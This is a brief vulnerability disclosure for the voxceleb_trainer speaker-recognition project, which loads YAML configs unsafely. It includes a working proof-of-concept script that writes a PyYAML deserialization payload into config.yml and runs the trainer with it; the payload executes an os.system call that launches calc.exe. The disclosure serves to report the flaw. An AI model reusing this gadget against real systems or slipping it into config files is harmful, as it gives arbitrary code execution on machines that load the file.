# Description

`voxceleb_trainer` contains the framework for training speaker recognition models described in the paper 'In defence of metric learning for speaker recognition', which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

```python
import os
#os.system('git clone https://github.com/clovaai/voxceleb_trainer.git')
os.chdir('voxceleb_trainer/')
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""

open('config.yml','w+').write(payload)
os.system('python3 trainSpeakerNet.py --config config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
